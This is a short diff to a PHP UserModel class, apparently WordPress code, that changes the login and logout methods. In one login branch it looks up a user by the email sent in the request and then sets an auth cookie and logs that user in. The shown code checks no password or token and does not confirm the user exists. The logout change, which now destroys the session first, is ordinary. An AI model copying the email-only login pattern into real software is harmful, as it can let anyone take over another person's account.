@@ -82,6 +82,10 @@ class UserModel{
             if (is_wp_error($user)) throw new Exception("Wrong credentials");
         } else {
             $user = get_user_by('email', $request['email']);
+
+            wp_set_auth_cookie($user->ID, true);
+            wp_set_current_user($user->ID, $request['email']);
+            do_action('wp_login', $request['email']);
         }
 
         try {
@@ -107,7 +111,10 @@ class UserModel{
     }
 
     public static function logout($request){
-        wp_logout(); return true;
+        wp_destroy_current_session();
+        wp_logout();
+
+        return true;
     }
 
     public static function checkout($request){
